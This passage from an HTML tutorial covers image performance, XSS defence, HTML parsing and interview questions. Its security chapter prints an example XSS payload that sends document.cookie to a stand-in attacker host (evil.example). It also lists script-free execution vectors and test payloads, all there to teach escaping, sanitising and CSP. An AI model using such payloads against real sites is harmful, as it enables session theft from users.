`<picture>` chooses between *different* images (a cropped mobile version, or AVIF/WebP with JPEG fallback). The browser uses the first `<source>` whose `type` it supports and whose `media` matches.

```html
<picture>
  <source type="image/avif" srcset="chart.avif">
  <source type="image/webp" srcset="chart.webp">
  <source media="(max-width: 600px)" srcset="chart-mobile.jpg">
  <img src="chart.jpg" alt="Orders by state" width="800" height="450" loading="lazy" decoding="async">
</picture>
```

The `<img>` inside is mandatory and carries `alt`, sizing and loading attributes. AVIF is typically 50% smaller than JPEG, WebP about 30%.

### Lazy loading and decoding

`loading="lazy"` on `<img>` and `<iframe>` defers the fetch until the element approaches the viewport. Use it for everything below the fold and never for the hero image, which needs the opposite. `decoding="async"` lets the browser decode the image off the main thread. `fetchpriority="high"` on the hero image tells the browser to fetch it before other images.

```html
<img src="hero.jpg" alt="…" width="1200" height="600" fetchpriority="high">     <!-- above the fold -->
<img src="fig-12.png" alt="…" width="800" height="400" loading="lazy" decoding="async">  <!-- far below -->
```

Always include `width` and `height` so the browser reserves space; otherwise lazy-loaded images cause layout shift (CLS) as they pop in.

### Resource hints in the head

| Link relation | Effect | Typical use |
|---|---|---|
| `preload` | Fetch now, high priority, for this page | Hero image, critical font, CSS discovered late |
| `preconnect` | Open DNS + TCP + TLS to an origin early | Font CDN, API host |
| `dns-prefetch` | Resolve DNS only | Third-party origins used later |
| `prefetch` | Fetch at low priority for the *next* page | Next chapter's HTML |
| `modulepreload` | Preload an ES module and its imports | App entry point |

```html
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="preload" href="/fonts/Montserrat-600.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/img/hero-1200.avif" as="image" imagesrcset="/img/hero-600.avif 600w, /img/hero-1200.avif 1200w" imagesizes="100vw">
<link rel="prefetch" href="/reports/week-38.html">
```

Fonts need `crossorigin` even on your own origin, because font requests are always CORS requests; forgetting it makes the browser download the font twice. Preloading more than two or three things defeats the purpose, since everything becomes "high priority".

### Scripts and styles

`<script defer>` (or `type="module"`) keeps parsing unblocked. Critical CSS for the first screen can be inlined in `<style>` and the rest loaded with `<link rel="stylesheet" media="print" onload="this.media='all'">`. `<link rel="stylesheet">` in the body is allowed and blocks rendering only of content after it.

### Measuring

Chrome DevTools > Lighthouse gives LCP (largest contentful paint, target under 2.5 s), CLS (layout shift, under 0.1) and INP (interaction delay, under 200 ms). The Network panel's "Priority" column shows whether your hints worked. `web.dev/measure` and PageSpeed Insights run the same audit against real-user field data.

> **Tip:** For a report that is mostly tables, the biggest win is usually not images at all but a single 400 KB font family loaded as four WOFF2 files. Subset the font (pyftsubset from fontTools) to Latin and the characters you use; a 180 KB TTF often becomes a 20 KB WOFF2.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"><title>Performance attributes</title>
  <link rel="preconnect" href="https://placehold.co">
  <style>body{font-family:Arial,sans-serif;margin:2rem} img{max-width:100%;height:auto;display:block;margin:1rem 0} .spacer{height:120vh;background:linear-gradient(#fff,#eee)} #log{white-space:pre;background:#f4f4f4;padding:1rem}</style>
</head>
<body>
  <h1>Hero loads first, the rest loads lazily</h1>
  <img src="https://placehold.co/800x300/E34F26/white?text=Hero+fetchpriority=high" alt="Hero" width="800" height="300" fetchpriority="high">
  <picture>
    <source media="(max-width: 600px)" srcset="https://placehold.co/400x200/1572B6/white?text=Mobile+crop">
    <img src="https://placehold.co/800x200/1572B6/white?text=Desktop+crop" alt="Art-directed picture" width="800" height="200">
  </picture>
  <p>Resize the preview narrower than 600px to see the mobile crop.</p>
  <div class="spacer"></div>
  <img id="lazy" src="https://placehold.co/800x300/999/white?text=Lazy+loaded+image" alt="Lazy image" width="800" height="300" loading="lazy" decoding="async">
  <p id="log">Scroll down: the lazy image request is made only when it nears the viewport.</p>
  <script>
    const img = document.getElementById('lazy'), log = document.getElementById('log');
    img.addEventListener('load', () => log.textContent += '\nLazy image loaded at ' + Math.round(performance.now()) + ' ms');
    log.textContent += '\nPage parsed at ' + Math.round(performance.now()) + ' ms';
  </script>
</body>
</html>
```

### Quiz

1. What does `sizes` tell the browser?
- [x] How wide the image will be displayed at different viewport widths
- [ ] The file size of each candidate
- [ ] The height of the image
> Combined with `srcset` widths and the pixel ratio, it picks the right candidate.

2. Which image should not be lazy-loaded?
- [ ] A chart on page 12
- [x] The above-the-fold hero image
- [ ] A footer logo
> Lazy loading delays fetch; the hero needs the opposite (`fetchpriority="high"`).

3. Why does a font preload need `crossorigin`?
- [ ] Fonts are always on another domain
- [x] Font requests are CORS requests; without it the preload does not match and the font downloads twice
- [ ] To enable caching
> The preload must use the same request mode as the actual fetch.

4. Which metric measures layout stability?
- [ ] LCP
- [x] CLS
- [ ] INP
> CLS is cumulative layout shift; missing image dimensions are its main cause.

### Exercises

1. **Responsive cover** — Write an `<img>` for a book cover with 300, 600 and 1200 px variants, displayed at 300 px on desktop and full width on phones under 480 px.
<details><summary>Solution</summary>

```html
<img src="cover-600.jpg" srcset="cover-300.jpg 300w, cover-600.jpg 600w, cover-1200.jpg 1200w"
     sizes="(max-width: 480px) 100vw, 300px" alt="Cover of the Employee Handbook" width="600" height="900">
```

</details>

2. **Head hints** — Add preconnect for `https://api.example.com`, preload for `/css/critical.css`, and prefetch for `/chapter-2.html`.
<details><summary>Solution</summary>

```html
<link rel="preconnect" href="https://api.example.com">
<link rel="preload" href="/css/critical.css" as="style">
<link rel="prefetch" href="/chapter-2.html">
```

</details>

### Interview Questions

**Q: Walk me through how the browser chooses an image from `srcset`.**
The browser first evaluates `sizes` against the viewport to get the layout width in CSS pixels, before any CSS has loaded, which is why `sizes` must be in the HTML. It multiplies that by the device pixel ratio to get the required pixel width, then picks the smallest `srcset` candidate at or above it, with some slack for cache: if a larger candidate is already cached it may use that. With `x` descriptors instead of `w`, the browser matches the DPR directly and ignores `sizes`. A common bug is omitting `sizes`, which defaults to `100vw` and causes the largest images to be fetched on desktop even for thumbnails.

**Q: What is the difference between `preload` and `prefetch`?**
`preload` is a mandatory, high-priority fetch of a resource the current page needs soon, discovered by the preload scanner before the parser gets to it, such as a font referenced only from CSS. `prefetch` is a low-priority hint to fetch something the *next* navigation might need, run when the browser is idle. Misusing preload for many resources starves the critical path, and browsers warn in the console if a preloaded resource is unused within a few seconds. `preconnect` is cheaper than either when you only know the origin, not the file.

**Q: How do you diagnose a poor LCP score?**
Open the Performance panel or Lighthouse, identify the LCP element (usually the hero image or the largest heading), then check its timeline: was the resource discovered late (fix with preload or by avoiding CSS background images), was it low priority (add `fetchpriority="high"`, remove `loading="lazy"`), was it too large (srcset, AVIF), or was rendering blocked by scripts and stylesheets (defer, inline critical CSS, preconnect to the font CDN). Server response time also counts, so I check TTFB first. On one client portfolio site, moving the hero from a CSS `background-image` to an `<img fetchpriority="high">` took LCP from 4.1 s to 1.8 s with no other change.

## Security: XSS basics & sanitising HTML

If you ever put user-supplied text into a page, whether a Fiverr order note rendered in a dashboard, a client name in an invoice template or a comment in a portal, you are one missing escape away from **cross-site scripting (XSS)**. XSS is the most common web vulnerability in the OWASP Top 10 for a reason: HTML happily executes anything that looks like a script, and templates that build HTML from strings make it easy to forget. This chapter covers what XSS is, the HTML-level defences, and how to sanitise when you must accept markup.

### What an attack looks like

Suppose a report page renders the client name with string concatenation:

```html
<p>Prepared for: <!-- name inserted here without escaping --></p>
```

A client name of `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` becomes a working image element whose `onerror` handler runs in your page's origin, with your users' cookies and session. Stored XSS keeps the payload in a database and hits every viewer; reflected XSS bounces it off a URL parameter; DOM XSS happens entirely in client-side JavaScript that writes to `innerHTML`.

### Defence 1: escape output by context

Every character that means something to the parser must be escaped when inserting untrusted text. In text content that is `&`, `<` and `>`; in attribute values also `"` and `'`.

| Context | Escape | Python | JavaScript |
|---|---|---|---|
| Element text | `& < >` | `html.escape(s, quote=False)` | `el.textContent = s` |
| Attribute value | `& < > " '` | `html.escape(s)` | `el.setAttribute('title', s)` |
| URL in `href` | Validate scheme, then URL-encode | `urllib.parse.quote(s)` | `encodeURIComponent(s)` |
| Inside `<script>` | Never insert user data; use `data-*` attributes and read them | JSON with `<` escaped as `<` | `JSON.parse(el.dataset.x)` |

Template engines do most of this for you when autoescaping is on: Jinja2 autoescapes `.html` templates in Flask and Django by default, but a `{{ value | safe }}` or `Markup()` bypasses it. In the browser, `textContent`, `setAttribute` and `createElement` are safe; `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` and `eval` are the dangerous sinks.

```js
// Safe: text is inserted as text, never parsed
const p = document.createElement('p');
p.textContent = 'Prepared for: ' + clientName;
// Dangerous: parsed as HTML
p.innerHTML = 'Prepared for: ' + clientName;
```

### Defence 2: sanitise when you must allow HTML

Sometimes users legitimately submit markup: a rich-text editor for SOP content, or a Markdown converter. Escaping would destroy the formatting, so you **sanitise**: parse the HTML, keep an allow-list of elements and attributes, drop everything else including `<script>`, `on*` handlers, `javascript:` URLs and `<iframe>`.

```python
import nh3   # Rust-based ammonia bindings; the maintained successor to bleach
clean = nh3.clean(user_html,
    tags={"p", "strong", "em", "ul", "ol", "li", "a", "h2", "h3"},
    attributes={"a": {"href", "title"}},
    url_schemes={"http", "https", "mailto"})
```

In the browser, DOMPurify is the standard: `DOMPurify.sanitize(dirty)` returns safe HTML that you can then assign to `innerHTML`. The native `Sanitizer` API (`element.setHTML(dirty)`) is shipping in Chrome and Firefox behind flags as of 2026 and is the future replacement. Never write your own regex-based sanitiser; the HTML parser has too many edge cases (`<scr<script>ipt>`, attribute quoting tricks, entity-encoded `javascript:`).

### Defence 3: Content Security Policy

CSP is an HTTP header (or meta tag) that tells the browser which sources may run. A strict policy neutralises most XSS even when an escape is missed, because injected inline scripts are simply not executed.

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'">
<script nonce="r4nd0m" src="/app.js"></script>
```

With a nonce policy, only scripts carrying the per-response random nonce run; injected `<script>` and `onerror=` handlers are blocked and reported. Start with `Content-Security-Policy-Report-Only` to see what would break.

### HTML-level hygiene

- `rel="noopener noreferrer"` on `target="_blank"` links to untrusted sites.
- `sandbox` on every iframe you do not control.
- Never build `href` from user input without checking the scheme; `javascript:alert(1)` is a valid URL.
- Set cookies with `HttpOnly` so even a successful XSS cannot read them, and `SameSite=Lax` against CSRF.
- Escape *inside* the right context: a value that is safe in text may still break out of a `style` attribute or a `<script>` block.

> **Warning:** "We strip `<script>` tags" is not a defence. `<img src=x onerror=…>`, `<svg onload=…>`, `<a href="javascript:…">` and `<iframe srcdoc=…>` all execute code with no script tag in sight. Only allow-list sanitising or full escaping works.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>XSS demo</title>
<style>body{font-family:Arial,sans-serif;margin:2rem;max-width:640px} textarea{width:100%;height:70px} .box{border:1px solid #ccc;padding:1rem;margin:.5rem 0;min-height:2rem} .bad{border-color:#c00} .good{border-color:#080}</style></head>
<body>
  <h1>Escaping vs innerHTML</h1>
  <p>Type or paste a "client name" below. Try: <code>&lt;img src=x onerror="this.parentNode.style.background='salmon'"&gt;</code></p>
  <textarea id="in">Northwind Realty <b>LLC</b></textarea>
  <p><button id="go">Render</button></p>
  <p>1. Inserted with <code>innerHTML</code> (vulnerable):</p>
  <div class="box bad" id="unsafe"></div>
  <p>2. Inserted with <code>textContent</code> (safe):</p>
  <div class="box good" id="safe"></div>
  <p>3. Sanitised with a small allow-list (only &lt;b&gt;, &lt;i&gt; kept):</p>
  <div class="box good" id="clean"></div>
  <script>
    function sanitise(dirty){
      const doc = new DOMParser().parseFromString(dirty, 'text/html');
      const allowed = new Set(['B','I','STRONG','EM']);
      const walk = node => { [...node.childNodes].forEach(ch => {
        if (ch.nodeType === 1) { if (!allowed.has(ch.tagName)) { ch.replaceWith(document.createTextNode(ch.textContent)); return; }
          [...ch.attributes].forEach(a => ch.removeAttribute(a.name)); walk(ch); } }); };
      walk(doc.body); return doc.body.innerHTML;
    }
    document.getElementById('go').onclick = () => {
      const v = document.getElementById('in').value;
      document.getElementById('unsafe').innerHTML = v;
      document.getElementById('safe').textContent = v;
      document.getElementById('clean').innerHTML = sanitise(v);
    };
    document.getElementById('go').click();
  </script>
</body>
</html>
```

### Quiz

1. Which DOM property inserts user text without parsing it as HTML?
- [ ] `innerHTML`
- [x] `textContent`
- [ ] `outerHTML`
> `textContent` treats the string as text; `innerHTML` hands it to the parser.

2. Why is stripping `<script>` tags insufficient?
- [x] Event handler attributes, `javascript:` URLs and SVG `onload` execute code without a script tag
- [ ] Browsers re-add the tag
- [ ] Scripts are cached
> Only allow-list sanitising or full escaping covers all execution vectors.

3. What does a nonce-based CSP do?
- [ ] Encrypts scripts
- [x] Allows only scripts carrying the per-response random token to run
- [ ] Blocks all JavaScript
> Injected scripts lack the nonce and are blocked, even if an escape was missed.

4. Which cookie flag stops JavaScript from reading a session cookie?
- [ ] `Secure`
- [x] `HttpOnly`
- [ ] `SameSite`
> `HttpOnly` limits the damage of a successful XSS; `SameSite` addresses CSRF.

### Exercises

1. **Safe attribute** — Given `title` from user input, write the safe Jinja2 line to render `<a href="/orders/{{ id }}" title="…">` and explain why.
<details><summary>Solution</summary>

```html
<a href="/orders/{{ id | urlencode }}" title="{{ title }}">{{ title }}</a>
```

With autoescaping on, `{{ title }}` escapes `& < > " '` for both attribute and text contexts; `urlencode` keeps the path segment safe. Never add `| safe`.

</details>

2. **Sanitiser config** — Configure nh3 to allow paragraphs, emphasis, lists and links with only http/https hrefs.
<details><summary>Solution</summary>

```python
import nh3
clean = nh3.clean(dirty, tags={"p","em","strong","ul","ol","li","a"},
                  attributes={"a": {"href"}}, url_schemes={"http","https"},
                  link_rel="noopener noreferrer")
```

</details>

### Interview Questions

**Q: What is XSS and what are its three types?**
Cross-site scripting is injecting attacker-controlled script into a page that other users view, so it runs with their session and origin privileges. Stored XSS saves the payload server-side (a profile field, a comment) and fires for everyone who loads it; reflected XSS returns a payload from the request, typically a crafted link; DOM-based XSS never touches the server, occurring when client-side code writes untrusted data such as `location.hash` into `innerHTML`. The defence for all three is the same layered approach: contextual output escaping, allow-list sanitising for rich content, a strict CSP, and `HttpOnly` cookies to limit impact.

**Q: How does escaping differ between HTML text, attributes, URLs and JavaScript contexts?**
Each context has its own parser, so the same string needs different treatment. In text content, `&`, `<` and `>` must become entities; in attribute values, quotes too, and the attribute must be quoted. In a URL, the scheme must be validated against an allow-list (`http`, `https`, `mailto`) because `javascript:` is a valid URL, and the value percent-encoded. Inside a `<script>` block there is no safe escaping for arbitrary text, so the right pattern is to embed data as JSON in a `data-` attribute or a `<script type="application/json">` element with `<` encoded as `<`, and parse it. Template engines like Jinja2 handle HTML text and attributes automatically but cannot know you are inside a URL or script context.

**Q: You inherit a Python report generator that builds HTML with f-strings from Excel data. How do you secure it?**
First, find every interpolation point and decide whether the data is trusted: an Excel column edited by clients or agents is untrusted. Replace string building with a template engine that autoescapes, or at minimum wrap every value in `html.escape()`. Then add a CSP header on the site that serves the reports, and run an HTML sanitiser over any column that intentionally contains markup. Finally add a test that feeds `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` through the pipeline and asserts the output is inert. In one QA dashboard I inherited, an agent's free-text remark field had already broken the layout with a stray `<`, which was the same bug as the security hole.

## HTML parsing & the DOM tree

Everything you have learned rests on one process: the browser turns a stream of bytes into a tree of nodes, the **DOM** (Document Object Model), and then renders and scripts against that tree. Understanding how the HTML5 parser builds the DOM explains why sloppy markup "works", why `<tbody>` appears from nowhere, why BeautifulSoup and Chrome disagree, and why `document.write` is evil. Senior interviews go here to separate people who memorised tags from people who understand the platform.

### From bytes to tree

1. **Decoding.** Bytes become characters using the declared or sniffed encoding (`<meta charset>` in the first 1024 bytes, or the HTTP header).
2. **Tokenising.** A state machine reads characters and emits tokens: start tags with attributes, end tags, text, comments, doctype. It handles `<`, `&`, quotes and the special "raw text" content of `<script>` and `<style>`.
3. **Tree construction.** Tokens are inserted into the DOM according to the current **insertion mode** (in head, in body, in table, in row, …), with a stack of open elements and error-recovery rules.
4. **Scripting.** When `</script>` is reached (for a non-deferred script), parsing pauses, the script runs and may modify the tree, then parsing resumes.

The result is a tree of `Node` objects: `Document` at the top, `Element` nodes, `Text` nodes, `Comment` nodes and one `DocumentType` node.

```html
<!DOCTYPE html>
<title>Hi</title>
<p>Hello <b>world
```

That deliberately broken input yields a complete tree: `html` → `head` → `title`, and `html` → `body` → `p` → text "Hello ", `b` → text "world". The parser implied `<html>`, `<head>`, `<body>` and closed `<b>` and `<p>` at the end of file. That is not luck; it is specified behaviour that every browser implements identically since HTML5.

### Rules the parser applies silently

| Input | Parser action |
|---|---|
| `<p>one<p>two` | Closes the first `<p>` when the second opens |
| `<p><div>x</div></p>` | `<div>` closes `<p>`; the trailing `</p>` becomes an empty paragraph |
| `<table><tr><td>x` | Inserts `<tbody>` around the `<tr>` |
| `<table>text<tr>` | Moves "text" *before* the table (foster parenting) |
| `<ul><li>a<li>b` | Closes each `<li>` when the next opens |
| `<b><i>x</b>y</i>` | Adoption agency algorithm reconstructs `<b><i>x</i></b><i>y</i>` |
| `<br/>` | Treated as `<br>`; the slash is ignored on all non-void elements too |
| `<select><div>` | `<div>` is ignored inside `<select>` |

The `<tbody>` and foster-parenting rows are the ones that bite scrapers. A table in the source with no `<tbody>` still has one in Chrome's DOM, so `document.querySelector('table > tr')` returns `null`. Meanwhile lxml's HTML parser does **not** insert `<tbody>`, and BeautifulSoup's result depends on which parser you chose: `html.parser` and `lxml` do not, `html5lib` does. That is why a selector copied from DevTools fails in a Python scraper.

```python
from bs4 import BeautifulSoup
html = "<table><tr><td>x</td></tr></table>"
print(BeautifulSoup(html, "lxml").select("table > tr"))      # [<tr>…]  no tbody
print(BeautifulSoup(html, "html5lib").select("table > tr"))  # []       tbody inserted, like a browser
```

### The DOM API

Once the tree exists, JavaScript reads and changes it. The core vocabulary:

```js
const table = document.querySelector('#rates');            // first match, CSS selector
const rows  = table.querySelectorAll('tbody tr');            // static NodeList
const cell  = document.createElement('td');
cell.textContent = '1,113';
rows[0].append(cell);                                        // append, prepend, before, after, replaceWith
rows[1].remove();
table.dataset.state;                                         // reads data-state="…"
table.closest('section');                                    // nearest ancestor
```

`querySelectorAll` returns a *static* list; `getElementsByTagName` returns a *live* `HTMLCollection` that changes as the document changes, a classic source of infinite loops when you add elements while iterating. `DOMParser` parses a string into a separate document without executing scripts, which is the safe way to inspect untrusted HTML.

### Rendering after parsing

The DOM is combined with CSS into the render tree, laid out, painted and composited. Changing the DOM invalidates parts of that pipeline; reading a layout property (`offsetHeight`) right after a write forces a synchronous **reflow**. Batch reads then writes, or use `requestAnimationFrame`, to avoid layout thrashing when updating hundreds of table rows.

### Why XHTML and HTML parse differently

Serving a file as `application/xhtml+xml` (or opening `.xhtml`) uses the XML parser: no implied elements, no recovery, a single error shows the yellow "XML Parsing Error" page. Serving the same bytes as `text/html` uses the forgiving HTML parser. The document that satisfies both, XHTML-strict markup that is also valid HTML5, is called **polyglot** HTML, and it is what a template shared by WeasyPrint and an EPUB pipeline should be.

> **Interview note:** "What happens when you type a URL and press Enter?" ends at this chapter: DNS, TCP/TLS, HTTP response, bytes to tokens to DOM, CSSOM, render tree, layout, paint, composite. Being able to say where `defer` scripts run, when `DOMContentLoaded` fires (after parsing, before images) and when `load` fires (after all resources) is the expected level.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Parser repair</title>
<style>body{font-family:Arial,sans-serif;margin:2rem;max-width:720px} textarea{width:100%;height:90px;font-family:monospace} pre{background:#f4f4f4;padding:1rem;overflow:auto}</style></head>
<body>
  <h1>What the parser builds</h1>
  <p>Edit the broken HTML and see the repaired tree the browser produces.</p>
  <textarea id="src"><table><tr><td>Texas<td>180</table><p>one<p>two<b><i>bold-italic</b>italic</i><ul><li>a<li>b</ul></textarea>
  <p><button id="parse">Parse</button></p>
  <pre id="out"></pre>
  <script>
    function dump(node, depth){ let s=''; for (const ch of node.childNodes){
      if (ch.nodeType===1){ s += '  '.repeat(depth) + '<' + ch.tagName.toLowerCase() + '>\n' + dump(ch, depth+1); }
      else if (ch.nodeType===3 && ch.textContent.trim()){ s += '  '.repeat(depth) + '"' + ch.textContent.trim() + '"\n'; } }
      return s; }
    document.getElementById('parse').onclick = () => {
      const doc = new DOMParser().parseFromString(document.getElementById('src').value, 'text/html');
      document.getElementById('out').textContent = dump(doc.body, 0);
    };
    document.getElementById('parse').click();
  </script>
</body>
</html>
```

### Quiz

1. Which element does the HTML parser insert around `<tr>` when it is missing?
- [ ] `<thead>`
- [x] `<tbody>`
- [ ] `<colgroup>`
> Table insertion mode requires a row group, so `<tbody>` is implied.

2. Why might a selector copied from DevTools fail in BeautifulSoup with `lxml`?
- [x] lxml does not apply HTML5 repair rules such as inserting `<tbody>`
- [ ] BeautifulSoup does not support CSS selectors
- [ ] DevTools shows XHTML
> Use the `html5lib` parser to get a browser-identical tree.

3. When does `DOMContentLoaded` fire?
- [ ] After all images load
- [x] After parsing finishes and deferred scripts have run
- [ ] Before `<head>` is parsed
> `load` waits for sub-resources; `DOMContentLoaded` only for the DOM.

4. What is the difference between `querySelectorAll` and `getElementsByTagName` results?
- [ ] None
- [x] The first is a static NodeList, the second a live HTMLCollection
- [ ] The first is faster in every case
> Live collections update as the DOM changes, which can surprise loops.

### Exercises

1. **Predict the tree** — Draw the DOM for `<p>Intro<div>Box</div>End</p>`.
<details><summary>Solution</summary>

```text
body
  p        -> "Intro"
  div      -> "Box"
  "End"    (text directly in body)
  p        (empty, from the stray </p>)
```

The `<div>` closes the open `<p>`; the later `</p>` with no open paragraph creates an empty one.

</details>

2. **Safe parsing** — Write JavaScript that takes an untrusted HTML string, parses it without running scripts, and returns the number of `<a>` elements.
<details><summary>Solution</summary>

```js
function countLinks(dirty) {
  const doc = new DOMParser().parseFromString(dirty, 'text/html');
  return doc.querySelectorAll('a').length;
}
```

`DOMParser` documents have scripting disabled, so `<script>` and event handlers never execute.

</details>

### Interview Questions

**Q: Why does the HTML parser never throw errors?**
Because the web is full of broken markup and browsers that refused to render it would lose users; every browser therefore implemented recovery heuristics, and they diverged, which made cross-browser development painful in the 2000s. HTML5 fixed this by specifying the recovery behaviour exactly, so every conforming parser produces the same tree for the same broken input. The trade-off is that mistakes are invisible: a missing `</p>` renders fine and only shows up as a wrong tree, a strange selector result or an EPUB failure. That is why validators and strict pipelines still matter even though browsers do not complain.

**Q: What is the difference between the DOM and the HTML source?**
The source is text; the DOM is the tree the browser built from it after decoding, tokenising, tree construction and any script mutations. They differ whenever the parser repaired something (implied `<tbody>`, closed tags), whenever JavaScript changed the page, and in normalisation (attribute names lowercased, entities decoded). "View source" shows the text; DevTools' Elements panel shows the live DOM, which is why `innerHTML` serialisation rarely round-trips byte for byte. Scrapers that read the source see one thing and users' browsers show another, which explains a whole class of "but it is in the HTML" bugs.

**Q: How does the parser handle `<script>` and why does `document.write` matter?**
When the tokeniser reaches `</script>` of a classic script, it pauses tree construction, waits for the script to download if external, and executes it synchronously, because the script may call `document.write` and insert tokens right there. That blocking is why scripts belong at the end or use `defer`/`async`. Modern browsers run a speculative preload scanner ahead of the blocked parser to keep fetching resources, but layout still waits. `document.write` after the parser has finished replaces the whole document, and Chrome blocks it for cross-origin scripts on slow connections, so it is effectively deprecated.

## HTML interview questions

This chapter is the exam paper. It collects the questions that come up in front-end, full-stack, document-engineering and QA interviews, grouped by the level of the role, with the shape of a strong answer. Practise saying them aloud; interviewers rate structure and concrete examples more than vocabulary. Each answer should follow the same pattern: definition in one sentence, why it matters, an example from your own work, and one trade-off or edge case.

### Junior questions

| Question | The answer in one line |
|---|---|
| What is the difference between HTML and HTML5? | HTML5 is the current living standard: semantic elements, native audio/video, forms with validation, canvas/SVG, and a specified parser. |
| Block vs inline? | Blocks start a new line and fill the width; inline elements flow within text and ignore width/height. |
| `<div>` vs `<span>`? | Both are meaningless containers; `div` is block, `span` is inline. |
| `<b>` vs `<strong>`? | `strong` conveys importance semantically; `b` is presentational. |
| What is `alt` for? | Text alternative for images: screen readers, broken images, search engines; empty for decoration. |
| `id` vs `class`? | `id` is unique per page and targets one element (anchors, labels); `class` is reusable and targets groups. |
| What are void elements? | Elements with no content or end tag: `br`, `img`, `input`, `meta`, `link`, `hr`. |
| What is the DOCTYPE for? | Switches the browser into standards mode. |

### Mid-level questions

**Semantic HTML.** Name the landmark elements and explain why they matter for accessibility and SEO. Bonus: `section` vs `article`, one `main` per page, `header`/`footer` scoping.

**Forms.** How does data reach the server (name/value pairs, GET vs POST, multipart for files)? What does the browser validate (`required`, `pattern`, `type`)? Why must the server validate again?

**Tables.** When are tables appropriate? What do `thead`, `scope` and `caption` do? How do you handle wide tables on mobile?

**Scripts.** `defer` vs `async` vs inline; when `DOMContentLoaded` fires.

```html
<script src="analytics.js" async></script>     <!-- independent, order irrelevant -->
<script src="app.js" defer></script>            <!-- needs the DOM, keep order -->
```

**Meta tags.** viewport, charset, description, Open Graph; why `keywords` is dead; what `canonical` fixes.

### Senior questions

**Parsing.** Describe the HTML parsing pipeline and three repair rules. Explain why `<tbody>` appears in DevTools. What is the difference between an HTML and an XML parser, and when does it matter (EPUB, XHTML)?

**Performance.** Walk through `srcset`/`sizes`, `loading="lazy"`, `fetchpriority`, `preload`/`preconnect`, and how each affects LCP and CLS.

**Security.** Explain XSS types, contextual escaping, sanitising with an allow-list, CSP with nonces, and cookie flags.

**Accessibility.** The first rule of ARIA, accessible names, live regions, focus management, WCAG AA contrast, and how you test (keyboard, NVDA/VoiceOver, axe).

**Web components.** Custom elements, shadow DOM, slots, lifecycle callbacks, and when you would not use shadow DOM.

### Document-engineering questions

These are the ones that fit Ali's profile and that generalist candidates cannot answer.

- Why does WeasyPrint accept HTML that epubcheck rejects? (html5lib parser vs XML parser.)
- How do you build one HTML source that produces a website, a PDF and an EPUB? (Polyglot XHTML, semantic headings for TOC/bookmarks, CSS media types, numeric entities.)
- What must be true of a heading structure for an automated TOC? (One h1, no skipped levels, stable ids.)
- How do you make a 40-page HTML table print correctly? (`thead` repetition, `page-break-inside: avoid` on rows, `caption`, `colgroup` widths.)
- What breaks when a Word document is exported to HTML? (Manual list numbering becomes `<p>`, styles become inline `mso-` CSS, images become base64 or a folder, named entities appear everywhere.)

```python
# The pipeline in one breath: one template, three outputs
html = template.render(report=data)                 # Jinja2, autoescape on
open("report.html", "w", encoding="utf-8").write(html)
HTML(string=html, base_url=".").write_pdf("report.pdf")   # WeasyPrint
# pandoc report.html -o report.epub --metadata title="Weekly Report"; then epubcheck report.epub
```

### How to answer

1. Answer the literal question in one sentence.
2. Say why it matters (user, business or maintenance impact).
3. Give a specific example with numbers: "the 767-page handbook", "168 form fields", "LCP from 4.1 s to 1.8 s".
4. Name a trade-off or an edge case, which is what distinguishes senior answers.
5. Stop. Let the interviewer follow up.

> **Interview note:** When you do not know, say what you do know and how you would find out: "I have not used the Sanitizer API in production; I use DOMPurify, and I would check MDN's compatibility table before switching." That is a stronger signal than bluffing, and interviewers test for it deliberately.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>HTML flashcards</title>
<style>
  body{font-family:Arial,sans-serif;margin:2rem;max-width:640px}
  .card{border:1px solid #ccc;border-radius:8px;padding:1.5rem;min-height:120px;cursor:pointer;background:#fff}
  .card h2{margin:0 0 .5rem;font-size:1.1rem;color:#E34F26} .card p{margin:0;color:#333}
  .hint{color:#777;font-size:.9rem} button{margin-top:1rem;padding:.5rem 1rem}
</style></head>
<body>
  <h1>HTML interview flashcards</h1>
  <p class="hint">Click the card to flip. Say the answer aloud before flipping.</p>
  <div class="card" id="card" role="button" tabindex="0" aria-live="polite"></div>
  <button id="next">Next question</button>
  <script>
    const qa = [
      ['What does <!DOCTYPE html> do?', 'Switches the browser into standards mode instead of quirks mode.'],
      ['defer vs async?', 'defer: download in parallel, run after parsing in order. async: run as soon as downloaded, order not guaranteed.'],
      ['Why does <tbody> appear in DevTools?', 'The HTML5 parser inserts a row group in table insertion mode; the source never had one.'],
      ['First rule of ARIA?', 'Do not use ARIA if a native HTML element already provides the semantics and behaviour.'],
      ['Why does epubcheck reject what Chrome renders?', 'EPUB uses an XML parser with no error recovery; Chrome uses the forgiving HTML5 parser.'],
      ['textContent vs innerHTML?', 'textContent inserts text; innerHTML parses HTML and is an XSS sink for untrusted data.'],
      ['What are srcset and sizes?', 'Candidate image widths plus the displayed width per viewport, so the browser picks the smallest adequate file.'],
      ['section vs article?', 'article is self-contained and syndicatable; section is a themed part of a whole with its own heading.']
    ];
    let i = 0, flipped = false; const card = document.getElementById('card');
    function show(){ card.innerHTML = '<h2>' + (flipped ? 'Answer' : 'Question ' + (i+1) + ' of ' + qa.length) + '</h2><p>' + qa[i][flipped ? 1 : 0].replace(/</g,'&lt;') + '</p>'; }
    card.addEventListener('click', () => { flipped = !flipped; show(); });
    card.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); flipped = !flipped; show(); } });
    document.getElementById('next').onclick = () => { i = (i + 1) % qa.length; flipped = false; show(); };
    show();
  </script>
</body>
</html>
```

### Quiz

1. An interviewer asks "block vs inline". Which pair is correct?
- [x] `<div>` is block, `<span>` is inline
- [ ] `<span>` is block, `<div>` is inline
- [ ] Both are inline
> Generic containers: `div` for block-level grouping, `span` for inline runs.

2. Which statement about `id` and `class` is true?
- [ ] Both must be unique
- [x] `id` must be unique per document; `class` may repeat
- [ ] `class` must be unique; `id` may repeat
> Duplicate ids break anchors, labels and `getElementById`.

